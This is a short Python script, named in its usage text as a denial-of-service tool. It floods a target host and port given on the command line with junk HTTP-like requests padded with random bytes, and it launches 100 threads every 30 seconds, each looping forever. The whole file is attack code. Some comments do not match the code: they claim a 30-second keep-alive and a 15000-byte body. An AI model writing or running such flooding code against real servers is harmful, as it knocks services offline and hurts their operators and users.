# create http traffic with 100 threads

import socket
import threading
import time
import sys
import random

def send():
    while True: 
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = sys.argv[1]
        port = int(sys.argv[2])
        bytes = random._urandom(1024)
        sock.connect((host, port))
        # send a keep alive packet every 30 seconds
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        # send http request  with body of  15000 bytes
        sock.sendall(b"GET / HTTP/1.1\rHost: " + host.encode() + b"\r\r" + b"X" + bytes + b"\r\r")
        sock.close()

def run():
    for i in range(100):
        t = threading.Thread(target=send)
        t.start()
        print("Thread %s started" % t.name)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python3 denial_of_service.py <host> <port>")
        sys.exit(1)
    while True:
        run()
        time.sleep(30)